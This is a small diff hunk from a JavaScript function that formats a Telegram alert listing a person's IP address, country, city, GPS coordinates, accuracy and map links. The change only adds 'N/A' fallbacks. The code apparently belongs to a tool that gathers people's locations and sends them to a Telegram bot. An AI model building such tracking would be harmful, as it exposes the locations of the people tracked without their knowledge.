@@ -1074,8 +1074,8 @@ async function sendDetailedTelegramAlert(data) {
 🌐 IP Address: \`${data.ip}\`
 ${data.geolocation ? `🗺️ Country: ${data.geolocation.country}` : ''}
 ${data.geolocation ? `🏙️ City: ${data.geolocation.city || 'Unknown'}` : ''}
-${data.location ? `📍 Coordinates: ${data.location.latitude}, ${data.location.longitude}` : ''}
-${data.location ? `🎯 Accuracy: ${data.location.accuracy}m` : ''}
+${data.location ? `📍 Coordinates: ${data.location.latitude || 'N/A'}, ${data.location.longitude || 'N/A'}` : ''}
+${data.location ? `🎯 Accuracy: ${data.location.accuracy || 'N/A'} meters` : ''}
 
 *🗺️ MAPS LINKS*
 ${data.maps ? `🗺️ Google Maps: ${data.maps.googleMaps}` : ''}
